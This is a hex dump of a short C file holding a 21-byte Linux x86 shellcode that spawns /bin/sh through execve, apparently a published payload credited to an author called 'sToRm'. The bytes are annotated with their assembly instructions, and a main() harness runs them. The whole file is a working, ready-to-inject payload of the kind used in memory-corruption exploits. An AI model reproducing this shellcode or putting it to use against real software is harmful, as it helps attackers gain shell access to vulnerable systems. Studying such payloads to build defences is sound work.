00000000  2f 2a 0d 0a 20 2a 20 28  6c 69 6e 75 78 2f 78 38  |/*.. * (linux/x8|
00000010  36 29 20 65 78 65 63 76  65 28 22 2f 62 69 6e 2f  |6) execve("/bin/|
00000020  73 68 22 2c 30 2c 30 29  20 0d 0a 20 2a 20 32 31  |sh",0,0) .. * 21|
00000030  20 62 79 74 65 73 0d 0a  20 2a 20 0d 0a 20 2a 20  | bytes.. * .. * |
00000040  68 74 74 70 3a 2f 2f 77  77 77 2e 67 6f 6e 75 6c  |http://www.gonul|
00000050  6c 79 6f 75 72 73 65 6c  66 2e 6f 72 67 0d 0a 20  |lyourself.org.. |
00000060  2a 20 73 54 6f 52 6d 20  3c 68 69 78 6d 6f 73 74  |* sToRm <hixmost|
00000070  6f 72 6d 40 68 6f 74 6d  61 69 6c 2e 63 6f 6d 3e  |orm@hotmail.com>|
00000080  0d 0a 20 2a 2f 0d 0a 0d  0a 63 68 61 72 20 73 68  |.. */....char sh|
00000090  65 6c 6c 63 6f 64 65 5b  5d 20 3d 0d 0a 20 20 20  |ellcode[] =..   |
000000a0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000000b0  20 20 20 20 20 20 20 20  20 20 20 20 20 2f 2f 20  |             // |
000000c0  3c 5f 73 74 61 72 74 3e  0d 0a 20 20 20 20 22 5c  |<_start>..    "\|
000000d0  78 33 31 5c 78 63 39 22  20 20 20 20 20 20 20 20  |x31\xc9"        |
000000e0  20 20 20 20 20 20 20 20  20 20 2f 2f 20 78 6f 72  |          // xor|
000000f0  20 20 20 20 25 65 63 78  2c 25 65 63 78 0d 0a 20  |    %ecx,%ecx.. |
00000100  20 20 20 22 5c 78 66 37  5c 78 65 31 22 20 20 20  |   "\xf7\xe1"   |
00000110  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 2f  |               /|
00000120  2f 20 6d 75 6c 20 20 20  20 25 65 63 78 0d 0a 20  |/ mul    %ecx.. |
00000130  20 20 20 22 5c 78 35 31  22 20 20 20 20 20 20 20  |   "\x51"       |
00000140  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 2f  |               /|
00000150  2f 20 70 75 73 68 20 20  20 25 65 63 78 0d 0a 20  |/ push   %ecx.. |
00000160  20 20 20 22 5c 78 36 38  5c 78 32 66 5c 78 32 66  |   "\x68\x2f\x2f|
00000170  5c 78 37 33 5c 78 36 38  22 20 20 20 20 20 20 2f  |\x73\x68"      /|
00000180  2f 20 70 75 73 68 20 20  20 24 30 78 36 38 37 33  |/ push   $0x6873|
00000190  32 66 32 66 0d 0a 20 20  20 20 22 5c 78 36 38 5c  |2f2f..    "\x68\|
000001a0  78 32 66 5c 78 36 32 5c  78 36 39 5c 78 36 65 22  |x2f\x62\x69\x6e"|
000001b0  20 20 20 20 20 20 2f 2f  20 70 75 73 68 20 20 20  |      // push   |
000001c0  24 30 78 36 65 36 39 36  32 32 66 0d 0a 20 20 20  |$0x6e69622f..   |
000001d0  20 22 5c 78 38 39 5c 78  65 33 22 20 20 20 20 20  | "\x89\xe3"     |
000001e0  20 20 20 20 20 20 20 20  20 20 20 20 20 2f 2f 20  |             // |
000001f0  6d 6f 76 20 20 20 20 25  65 73 70 2c 25 65 62 78  |mov    %esp,%ebx|
00000200  0d 0a 20 20 20 20 22 5c  78 62 30 5c 78 30 62 22  |..    "\xb0\x0b"|
00000210  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000220  20 20 2f 2f 20 6d 6f 76  20 20 20 20 24 30 78 62  |  // mov    $0xb|
00000230  2c 25 61 6c 0d 0a 20 20  20 20 22 5c 78 63 64 5c  |,%al..    "\xcd\|
00000240  78 38 30 22 20 20 20 20  20 20 20 20 20 20 20 20  |x80"            |
00000250  20 20 20 20 20 20 2f 2f  20 69 6e 74 20 20 20 20  |      // int    |
00000260  24 30 78 38 30 0d 0a 3b  0d 0a 0d 0a 69 6e 74 20  |$0x80..;....int |
00000270  6d 61 69 6e 28 29 20 7b  0d 0a 0d 0a 20 20 20 20  |main() {....    |
00000280  69 6e 74 20 28 2a 66 29  28 29 20 3d 20 28 69 6e  |int (*f)() = (in|
00000290  74 28 2a 29 28 29 29 73  68 65 6c 6c 63 6f 64 65  |t(*)())shellcode|
000002a0  3b 0d 0a 20 20 20 20 70  72 69 6e 74 66 28 22 4c  |;..    printf("L|
000002b0  65 6e 67 74 68 3a 20 25  75 5c 6e 22 2c 20 73 74  |ength: %u\n", st|
000002c0  72 6c 65 6e 28 73 68 65  6c 6c 63 6f 64 65 29 29  |rlen(shellcode))|
000002d0  3b 0d 0a 20 20 20 20 66  28 29 3b 0d 0a 20 20 20  |;..    f();..   |
000002e0  20 0d 0a 7d                                       | ..}|
000002e4
